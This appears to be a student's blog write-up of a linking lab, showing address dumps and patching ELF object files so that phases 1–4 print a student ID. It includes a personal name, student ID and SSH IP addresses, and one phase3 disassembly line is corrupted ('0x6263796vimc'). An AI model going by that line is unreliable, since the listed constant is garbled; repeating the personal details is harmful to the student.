class="number">-3.6</span><span class="number">.3</span>/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/local/java/jdk<span class="number">-16</span>/bin:/root/.local/bin:/root/bin:/root/.local/bin</span><br><span class="line">env[<span class="number">14</span>] *env    <span class="number">0x7ffdf2467ec5</span>  <span class="number">140728668159685</span></span><br><span class="line">PWD=/root/code/lab5</span><br><span class="line">env[<span class="number">15</span>] *env    <span class="number">0x7ffdf2467ed9</span>  <span class="number">140728668159705</span></span><br><span class="line">JAVA_HOME=/usr/local/java/jdk<span class="number">-16</span></span><br><span class="line">env[<span class="number">16</span>] *env    <span class="number">0x7ffdf2467efa</span>  <span class="number">140728668159738</span></span><br><span class="line">LANG=en_US.UTF<span class="number">-8</span></span><br><span class="line">env[<span class="number">17</span>] *env    <span class="number">0x7ffdf2467f0b</span>  <span class="number">140728668159755</span></span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">env[<span class="number">18</span>] *env    <span class="number">0x7ffdf2467f22</span>  <span class="number">140728668159778</span></span><br><span class="line">SHLVL=<span class="number">1</span></span><br><span class="line">env[<span class="number">19</span>] *env    <span class="number">0x7ffdf2467f2a</span>  <span class="number">140728668159786</span></span><br><span class="line">HOME=/root</span><br><span class="line">env[<span class="number">20</span>] *env    <span class="number">0x7ffdf2467f35</span>  <span class="number">140728668159797</span></span><br><span class="line">LOGNAME=root</span><br><span class="line">env[<span class="number">21</span>] *env    <span class="number">0x7ffdf2467f42</span>  <span class="number">140728668159810</span></span><br><span class="line">CLASSPATH=/usr/local/java/jdk<span class="number">-16</span>/lib</span><br><span class="line">env[<span class="number">22</span>] *env    <span class="number">0x7ffdf2467f67</span>  <span class="number">140728668159847</span></span><br><span class="line">SSH_CONNECTION=<span class="number">111.40</span><span class="number">.58</span><span class="number">.130</span> <span class="number">20088</span> <span class="number">172.25</span><span class="number">.37</span><span class="number">.193</span> <span class="number">22</span></span><br><span class="line">env[<span class="number">23</span>] *env    <span class="number">0x7ffdf2467f9b</span>  <span class="number">140728668159899</span></span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">env[<span class="number">24</span>] *env    <span class="number">0x7ffdf2467fbe</span>  <span class="number">140728668159934</span></span><br><span class="line">XDG_RUNTIME_DIR=/run/user/<span class="number">0</span></span><br><span class="line">env[<span class="number">25</span>] *env    <span class="number">0x7ffdf2467fda</span>  <span class="number">140728668159962</span></span><br><span class="line">_=./LinkAddress</span><br><span class="line">big <span class="built_in">array</span>       <span class="number">0x40602140</span>      <span class="number">1080041792</span></span><br><span class="line">huge <span class="built_in">array</span>      <span class="number">0x602140</span>        <span class="number">6299968</span></span><br><span class="line">global  <span class="number">0x602080</span>        <span class="number">6299776</span></span><br><span class="line">gint0   <span class="number">0x60212c</span>        <span class="number">6299948</span></span><br><span class="line">glong   <span class="number">0x602088</span>        <span class="number">6299784</span></span><br><span class="line">cstr    <span class="number">0x6020a0</span>        <span class="number">6299808</span></span><br><span class="line">pstr    <span class="number">0x400d80</span>        <span class="number">4197760</span></span><br><span class="line">gc      <span class="number">0x400dac</span>        <span class="number">4197804</span></span><br><span class="line">cc      <span class="number">0x400dc0</span>        <span class="number">4197824</span></span><br><span class="line">local <span class="built_in">int</span> <span class="number">0</span>     <span class="number">0x7ffdf246539c</span>  <span class="number">140728668148636</span></span><br><span class="line">local <span class="built_in">int</span> <span class="number">1</span>     <span class="number">0x7ffdf2465398</span>  <span class="number">140728668148632</span></span><br><span class="line">local static <span class="built_in">int</span> <span class="number">0</span>      <span class="number">0x602130</span>        <span class="number">6299952</span></span><br><span class="line">local static <span class="built_in">int</span> <span class="number">1</span>      <span class="number">0x602110</span>        <span class="number">6299920</span></span><br><span class="line">local astr      <span class="number">0x7ffdf2464fa0</span>  <span class="number">140728668147616</span></span><br><span class="line">local pstr      <span class="number">0x400e30</span>        <span class="number">4197936</span></span><br><span class="line">argc    <span class="number">0x7ffdf2464f9c</span>  <span class="number">140728668147612</span></span><br><span class="line">argv    <span class="number">0x7ffdf24654c8</span>  <span class="number">140728668148936</span></span><br><span class="line">argv[<span class="number">0</span>]     <span class="number">7f</span>fdf2467622</span><br><span class="line">argv[<span class="number">1</span>]     <span class="number">7f</span>fdf2467630</span><br><span class="line">argv[<span class="number">2</span>]     <span class="number">7f</span>fdf2467633</span><br><span class="line">argv[<span class="number">3</span>]     <span class="number">7f</span>fdf246763e</span><br><span class="line">argv[<span class="number">0</span>] <span class="number">0x7ffdf2467622</span>  <span class="number">140728668157474</span></span><br><span class="line">./LinkAddress</span><br><span class="line">argv[<span class="number">1</span>] <span class="number">0x7ffdf2467630</span>  <span class="number">140728668157488</span></span><br><span class="line">-u</span><br><span class="line">argv[<span class="number">2</span>] <span class="number">0x7ffdf2467633</span>  <span class="number">140728668157491</span></span><br><span class="line"><span class="number">1190200215</span></span><br><span class="line">argv[<span class="number">3</span>] <span class="number">0x7ffdf246763e</span>  <span class="number">140728668157502</span></span><br><span class="line">喻灿红</span><br><span class="line">p1      <span class="number">0x7f57a5865010</span>  <span class="number">140014415925264</span></span><br><span class="line">p2      <span class="number">0x7f57b5e26010</span>  <span class="number">140014690394128</span></span><br><span class="line">p3      <span class="number">0x7f57b5e05010</span>  <span class="number">140014690258960</span></span><br><span class="line">p4      <span class="number">0x7f5765864010</span>  <span class="number">140013342179344</span></span><br><span class="line">p5      (nil)   <span class="number">0</span></span><br><span class="line">show_pointer    <span class="number">0x400738</span>        <span class="number">4196152</span></span><br><span class="line">useless <span class="number">0x40072d</span>        <span class="number">4196141</span></span><br><span class="line">main    <span class="number">0x400768</span>        <span class="number">4196200</span></span><br><span class="line">exit    <span class="number">0x400630</span>        <span class="number">4195888</span></span><br><span class="line">printf  <span class="number">0x4005f0</span>        <span class="number">4195824</span></span><br><span class="line">malloc  <span class="number">0x400620</span>        <span class="number">4195872</span></span><br><span class="line">free    <span class="number">0x4005c0</span>        <span class="number">4195776</span></span><br><span class="line">strcpy  <span class="number">0x4005d0</span>        <span class="number">4195792</span></span><br></pre></td></tr></table></figure><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><p>查看phase1.o的汇编代码：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519215620823.png" alt="image-20210519215620823"></p><p>得函数会将要打印的内容放入eax中，这个地址需要重定位到<code>.data+0x53</code>的位置。</p><p>通过查看phase.o的elf可得<code>.data</code>的偏移为0x60：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519221731703.png" alt="image-20210519221731703"></p><p>将<code>0x60+0x53=0xB3</code>位置开始的内容改为学号，最后要用<code>00</code>结束：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519222709855.png" alt="image-20210519222709855"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519222612164.png" alt="image-20210519222612164"></p><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><p>有三种可选方案：</p><ol><li>在do_phase中调用puts函数。<br>但因为puts函数是外部符号，需要新建一个重定位项，违背了只能修改.text节的实验要求，故舍弃。</li><li>压入学号字符串，压入串地址作为参数调用包含puts的那个函数。<br>如下。</li><li>直接jmp到puts前push参数的语句。</li></ol><p>phase2.o的汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;mFwieYqD&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 08                 sub    $0x8,%esp</span><br><span class="line">   a:    83 ec 08                 sub    $0x8,%esp</span><br><span class="line">   d:    68 00 00 00 00           push   $0x0</span><br><span class="line">  12:    ff 75 08                 pushl  0x8(%ebp)</span><br><span class="line">  15:    e8 fc ff ff ff           call   16 &lt;mFwieYqD+0x16&gt;</span><br><span class="line">  1a:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  1d:    85 c0                    test   %eax,%eax</span><br><span class="line">  1f:    75 10                    jne    31 &lt;mFwieYqD+0x31&gt;</span><br><span class="line">  21:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  24:    ff 75 08                 pushl  0x8(%ebp)</span><br><span class="line">  27:    e8 fc ff ff ff           call   28 &lt;mFwieYqD+0x28&gt;</span><br><span class="line">  2c:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  2f:    eb 01                    jmp    32 &lt;mFwieYqD+0x32&gt;</span><br><span class="line">  31:    90                       nop</span><br><span class="line">  32:    c9                       leave  </span><br><span class="line">  33:    c3                       ret    </span><br><span class="line"></span><br><span class="line">00000034 &lt;do_phase&gt;:</span><br><span class="line">  34:    f3 0f 1e fb              endbr32 </span><br><span class="line">  38:    55                       push   %ebp</span><br><span class="line">  39:    89 e5                    mov    %esp,%ebp</span><br><span class="line">  3b:    90                       nop</span><br><span class="line">  3c:    90                       nop</span><br><span class="line">  3d:    90                       nop</span><br><span class="line">  3e:    90                       nop</span><br><span class="line">  3f:    90                       nop</span><br><span class="line">  40:    90                       nop</span><br><span class="line">  41:    90                       nop</span><br><span class="line">  42:    90                       nop</span><br><span class="line">  43:    90                       nop</span><br><span class="line">  44:    90                       nop</span><br><span class="line">  45:    90                       nop</span><br><span class="line">  46:    90                       nop</span><br><span class="line">  47:    90                       nop</span><br><span class="line">  48:    90                       nop</span><br><span class="line">  49:    90                       nop</span><br><span class="line">  4a:    90                       nop</span><br><span class="line">  4b:    90                       nop</span><br><span class="line">  4c:    90                       nop</span><br><span class="line">  4d:    90                       nop</span><br><span class="line">  4e:    90                       nop</span><br><span class="line">  4f:    90                       nop</span><br><span class="line">  50:    90                       nop</span><br><span class="line">  51:    90                       nop</span><br><span class="line">  52:    90                       nop</span><br><span class="line">  53:    90                       nop</span><br><span class="line">  54:    90                       nop</span><br><span class="line">  55:    90                       nop</span><br></pre></td></tr></table></figure><p>分析可得，需要在do_phase函数中创建一个学号字符串，然后将该字符串的地址作为参数压栈，调用函数mFwieYqD。</p><p>编写汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub $0xc, %esp</span><br><span class="line">movl $0x30393131, -0xc(%ebp)</span><br><span class="line">movl $0x32303032, -0x8(%ebp)</span><br><span class="line">movl $0x00003531, -0x4(%ebp)</span><br><span class="line">lea -0xc(%ebp), %eax</span><br><span class="line">push %eax</span><br><span class="line">call 0x00   # 先随便填一个值</span><br></pre></td></tr></table></figure><p>汇编成机器码后修改phase2.o：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525211821409.png" alt="image-20210525211821409"></p><p>成功压入学号字符串参数：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525204141593.png" alt="image-20210525204141593"></p><p>接着根据函数mFwieYqD的偏移量来确定call的偏移量，读elf得mFwieYqD在.text节的0偏移处：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525204701370.png" alt="image-20210525204701370"></p><p>下一条指令的地址为0x5c，故得call后面的偏移量为0x0-0x5c = -0x5c = ffffffa4，将它填入phase2.o的call后面：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525212256082.png" alt="image-20210525212256082"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525212737634.png" alt="image-20210525212737634"></p><blockquote><p>错误：operand type mismatch for ‘push’</p><p>原因：没有加上<code>-m32 -c</code>参数，在64-bit mode下面，push和栈进行交互的时候，不能使用%eax，而要使用%rax。</p></blockquote><h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><p>phase3的汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;do_phase&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 28                 sub    $0x28,%esp</span><br><span class="line">   a:    65 a1 14 00 00 00        mov    %gs:0x14,%eax</span><br><span class="line">  10:    89 45 f4                 mov    %eax,-0xc(%ebp)</span><br><span class="line">  13:    31 c0                    xor    %eax,%eax</span><br><span class="line">  15:    c7 45 e9 69 76 74 67     movl   $0x67747669,-0x17(%ebp)</span><br><span class="line">  1c:    c7 45 ed 6c 79 63 62     movl   $0x6263796vimc,-0x13(%ebp)</span><br><span class="line">  23:    66 c7 45 f1 61 7a        movw   $0x7a61,-0xf(%ebp)</span><br><span class="line">  29:    c6 45 f3 00              movb   $0x0,-0xd(%ebp)</span><br><span class="line">  2d:    c7 45 e4 00 00 00 00     movl   $0x0,-0x1c(%ebp)</span><br><span class="line">  34:    eb 28                    jmp    5e &lt;do_phase+0x5e&gt;</span><br><span class="line">  36:    8d 55 e9                 lea    -0x17(%ebp),%edx</span><br><span class="line">  39:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  3c:    01 d0                    add    %edx,%eax</span><br><span class="line">  3e:    0f b6 00                 movzbl (%eax),%eax</span><br><span class="line">  41:    0f b6 c0                 movzbl %al,%eax</span><br><span class="line">  44:    0f b6 80 00 00 00 00     movzbl 0x0(%eax),%eax</span><br><span class="line">truetruetrue47: R_386_32    orEYJGWrtE</span><br><span class="line">  4b:    0f be c0                 movsbl %al,%eax</span><br><span class="line">  4e:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  51:    50                       push   %eax</span><br><span class="line">  52:    e8 fc ff ff ff           call   53 &lt;do_phase+0x53&gt;</span><br><span class="line">truetruetrue53: R_386_PC32    putchar</span><br><span class="line">  57:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  5a:    83 45 e4 01              addl   $0x1,-0x1c(%ebp)</span><br><span class="line">  5e:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  61:    83 f8 09                 cmp    $0x9,%eax</span><br><span class="line">  64:    76 d0                    jbe    36 &lt;do_phase+0x36&gt;</span><br><span class="line">  66:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  69:    6a 0a                    push   $0xa</span><br><span class="line">  6b:    e8 fc ff ff ff           call   6c &lt;do_phase+0x6c&gt;</span><br><span class="line">truetruetrue6c: R_386_PC32    putchar</span><br><span class="line">  70:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  73:    90                       nop</span><br><span class="line">  74:    8b 45 f4                 mov    -0xc(%ebp),%eax</span><br><span class="line">  77:    65 33 05 14 00 00 00     xor    %gs:0x14,%eax</span><br><span class="line">  7e:    74 05                    je     85 &lt;do_phase+0x85&gt;</span><br><span class="line">  80:    e8 fc ff ff ff           call   81 &lt;do_phase+0x81&gt;</span><br><span class="line">truetruetrue81: R_386_PC32    __stack_chk_fail</span><br><span class="line">  85:    c9                       leave  </span><br><span class="line">  86:    c3                       ret </span><br></pre></td></tr></table></figure><p>可得大概框架为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> orEYJGWrtE[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> cookie[] = PHASE3_COOKIE;</span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ )</span><br><span class="line">                <span class="built_in">printf</span>( <span class="string">&quot;%c&quot;</span>, orEYJGWrtE[ (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(cookie[i]) ] );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;\n&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模块入口函数do_phase()依次遍历一个COOKIE字符串（由一组互不相同的英文字母组成，且总长度与学号字符串相同）中的每一字符，并通过一个映射数组将该字符的不同可能ASCII编码取值映射为输出字符。  </p><p>分析汇编代码中的mov指令可知压入的字符数组内容为ivtglycbaz，对应的unsigned char为69 76 74 67 6c 79 63 62 61 7a（十六进制）:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526145900036.png" alt="image-20210526145900036"></p><p>在phase3_patch.c文件中添加orEYJGWrtE字符数组的强定义代替phase3中的弱定义，按照对应的位置填入学号，如orEYJGWrtE[0x69 = 105] = ‘1’:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526154957125.png" alt="image-20210526154957125"></p><p> 成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526160458435.png" alt="image-20210526160458435"></p><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><p>phase4代码框架为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> cookie[] = PHASE4_COOKIE;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cookie)<span class="number">-1</span>; i++ ) </span><br><span class="line">       &#123;</span><br><span class="line">                c = cookie[i];</span><br><span class="line">                <span class="keyword">switch</span> (c) </span><br><span class="line">                &#123;</span><br><span class="line">                      <span class="comment">// 映射关系</span></span><br><span class="line">                      <span class="keyword">case</span> ‘A’: &#123; c = <span class="number">48</span>; <span class="keyword">break</span>; &#125; </span><br><span class="line">                      <span class="keyword">case</span> ‘B’: &#123; c = <span class="number">121</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                        …</span><br><span class="line">                      <span class="keyword">case</span> ‘Z’: &#123; c = <span class="number">93</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模块入口函数do_phase()依次遍历一个COOKIE字符串（由一组互不相同的大写英文字母组成，且总长度与学号字符串相同）中的每一字符，并使用一个switch语句将该字符的不同可能ASCII编码取值映射为输出字符。  </p><p>与phase3类似，得到顺序字符数组为YJAFXRBDQW。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210526164951173.png" alt="image-20210526164951173"></p><p>汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;do_phase&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 28                 sub    $0x28,%esp</span><br><span class="line">   a:    65 a1 14 00 00 00        mov    %gs:0x14,%eax</span><br><span class="line">  10:    89 45 f4                 mov    %eax,-0xc(%ebp)</span><br><span class="line">  13:    31 c0                    xor    %eax,%eax</span><br><span class="line">  15:    c7 45 e9 59 4a 41 46     movl   $0x46414a59,-0x17(%ebp)</span><br><span class="line">  1c:    c7 45 ed 58 52 42 44     movl   $0x44425258,-0x13(%ebp)</span><br><span class="line">  23:    66 c7 45 f1 51 57        movw   $0x5751,-0xf(%ebp)</span><br><span class="line">  29:    c6 45 f3 00              movb   $0x0,-0xd(%ebp)</span><br><span class="line">  2d:    c7 45 e4 00 00 00 00     movl   $0x0,-0x1c(%ebp)</span><br><span class="line">  34:    e9 e3 00 00 00           jmp    11c &lt;do_phase+0x11c&gt;</span><br><span class="line">  39:    8d 55 e9                 lea    -0x17(%ebp),%edx   # cookie字符串地址</span><br><span class="line">  3c:    8b 45 e4                 mov    -0x1c(%ebp),%eax</span><br><span class="line">  3f:    01 d0                    add    %edx,%eax</span><br><span class="line">  41:    0f b6 00                 movzbl (%eax),%eax</span><br><span class="line">  44:    88 45 e3                 mov    %al,-0x1d(%ebp)  </span><br><span class="line">  47:    0f be 45 e3              movsbl -0x1d(%ebp),%eax   # 顺序取字符</span><br><span class="line">  4b:    83 e8 41                 sub    $0x41,%eax    # 对应的ASCII减去0x41</span><br><span class="line">  4e:    83 f8 19                 cmp    $0x19,%eax    # 与0x19比较</span><br><span class="line">  51:    0f 87 b1 00 00 00        ja     108 &lt;do_phase+0x108&gt;   # 若大于0x19则跳转（非大写字母）</span><br><span class="line">  57:    8b 04 85 00 00 00 00     mov    0x0(,%eax,4),%eax   # (cookie[i]-0x41)*4</span><br><span class="line">truetruetrue5a: R_386_32    .rodata</span><br><span class="line">  5e:    3e ff e0                 notrack jmp *%eax</span><br><span class="line">  61:    c6 45 e3 6a              movb   $0x6a,-0x1d(%ebp)</span><br><span class="line">  65:    e9 9e 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  6a:    c6 45 e3 39              movb   $0x39,-0x1d(%ebp)</span><br><span class="line">  6e:    e9 95 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  73:    c6 45 e3 36              movb   $0x36,-0x1d(%ebp)</span><br><span class="line">  77:    e9 8c 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  7c:    c6 45 e3 31              movb   $0x31,-0x1d(%ebp)</span><br><span class="line">  80:    e9 83 00 00 00           jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  85:    c6 45 e3 69              movb   $0x69,-0x1d(%ebp)</span><br><span class="line">  89:    eb 7d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  8b:    c6 45 e3 66              movb   $0x66,-0x1d(%ebp)</span><br><span class="line">  8f:    eb 77                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  91:    c6 45 e3 37              movb   $0x37,-0x1d(%ebp)</span><br><span class="line">  95:    eb 71                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  97:    c6 45 e3 32              movb   $0x32,-0x1d(%ebp)</span><br><span class="line">  9b:    eb 6b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  9d:    c6 45 e3 30              movb   $0x30,-0x1d(%ebp)</span><br><span class="line">  a1:    eb 65                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  a3:    c6 45 e3 7c              movb   $0x7c,-0x1d(%ebp)</span><br><span class="line">  a7:    eb 5f                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  a9:    c6 45 e3 5a              movb   $0x5a,-0x1d(%ebp)</span><br><span class="line">  ad:    eb 59                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  af:    c6 45 e3 5e              movb   $0x5e,-0x1d(%ebp)</span><br><span class="line">  b3:    eb 53                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  b5:    c6 45 e3 44              movb   $0x44,-0x1d(%ebp)</span><br><span class="line">  b9:    eb 4d                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  bb:    c6 45 e3 3a              movb   $0x3a,-0x1d(%ebp)</span><br><span class="line">  bf:    eb 47                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  c1:    c6 45 e3 34              movb   $0x34,-0x1d(%ebp)</span><br><span class="line">  c5:    eb 41                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  c7:    c6 45 e3 5c              movb   $0x5c,-0x1d(%ebp)</span><br><span class="line">  cb:    eb 3b                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  cd:    c6 45 e3 47              movb   $0x47,-0x1d(%ebp)</span><br><span class="line">  d1:    eb 35                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  d3:    c6 45 e3 5b              movb   $0x5b,-0x1d(%ebp)</span><br><span class="line">  d7:    eb 2f                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  d9:    c6 45 e3 58              movb   $0x58,-0x1d(%ebp)</span><br><span class="line">  dd:    eb 29                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span class="line">  df:    c6 45 e3 4b              movb   $0x4b,-0x1d(%ebp)</span><br><span class="line">  e3:    eb 23                    jmp    108 &lt;do_phase+0x108&gt;</span><br><span 